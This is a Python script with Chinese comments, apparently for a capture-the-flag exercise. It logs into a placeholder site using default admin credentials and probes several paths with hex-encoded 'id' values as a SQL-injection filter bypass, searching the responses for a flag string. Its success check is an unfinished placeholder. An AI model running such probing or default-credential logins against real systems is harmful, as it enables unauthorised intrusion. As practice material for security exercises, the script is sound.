import requests
import re

# ================= 配置区 =================
BASE_URL = "http://example.com"
LOGIN_URL = f"{BASE_URL}/login"
LOGIN_DATA = {
    "username": "admin",
    "password": "password"
}
# 需要遍历的路径列表
PATH_LIST = [
    "/user.php",
    "/api/v1/getinfo",
    "/search",
    "/index.php"
]

# SQL注入参数名
INJECT_PARAM = "id"

# ================= 核心逻辑 =================

def generate_hex_bypass():
    """将数字1转换为SQL注入常用的十六进制格式"""
    num = 1
    # 数字1的十六进制表示 (0x1)
    hex_num = hex(num)
    # 字符'1'的十六进制表示 (0x31)，常用于绕过对单引号或字符的过滤
    hex_char = hex(ord(str(num)))
    
    print(f"[*] 数字 {num} 的十六进制表示: {hex_num}")
    print(f"[*] 字符 '{num}' 的十六进制表示: {hex_char}")
    
    return hex_num, hex_char

def main():
    hex_num, hex_char = generate_hex_bypass()
    
    session = requests.Session()
    
    # 1. 维护认证状态：登录
    print(f"[*] 正在登录: {LOGIN_URL}")
    try:
        login_resp = session.post(LOGIN_URL, data=LOGIN_DATA, timeout=10)
        if login_resp.status_code == 200 and "logout" in login_resp.text.lower():
            print("[+] 登录成功，Session已维护")
        else:
            print("[-] 登录可能失败，继续尝试访问...")
    except Exception as e:
        print(f"[-] 登录请求异常: {e}")
        return

    # 2. 遍历路径列表，使用十六进制绕过进行探测
    print("[*] 开始遍历路径并测试十六进制绕过...")
    for path in PATH_LIST:
        target_url = f"{BASE_URL}{path}"
        
        # 尝试两种十六进制格式
        payloads = {
            f"{INJECT_PARAM}={hex_num}": hex_num,
            f"{INJECT_PARAM}={hex_char}": hex_char
        }
        
        for payload_str, payload_val in payloads.items():
            full_url = f"{target_url}?{payload_str}"
            try:
                print(f"[*] 测试: {full_url}")
                resp = session.get(full_url, timeout=10)
                
                # 简单的Flag正则匹配 (常见CTF flag格式)
                flags = re.findall(r'flag\{[a-zA-Z0-9_!@#$%^&*()-+=]+\}', resp.text, re.IGNORECASE)
                if flags:
                    print(f"[+] 发现 Flag: {flags[0]}")
                    return
                    
                # 检查是否有异常回显或成功绕过迹象
                if resp.status_code == 200 and len(resp.text) > 0:
                    # 此处可根据实际页面特征添加判断逻辑
                    pass

            except requests.exceptions.RequestException as e:
                print(f"[-] 请求异常: {e}")
                continue

if __name__ == "__main__":
    main()